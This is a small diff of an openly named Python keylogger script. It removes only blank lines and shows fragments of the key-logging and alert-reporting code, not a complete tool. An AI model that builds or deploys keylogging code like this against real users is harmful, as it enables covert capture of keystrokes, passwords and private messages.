@@ -70,8 +70,6 @@ def sendAlert(self):
         print("Error to send Alert")
         pass
 
-
-
 class Keylogger:
     def __init__(self, interval):
         self.interval = interval
@@ -90,7 +88,6 @@ class Keylogger:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
         self.log += name
-
 
     def report(self):
         if self.log:
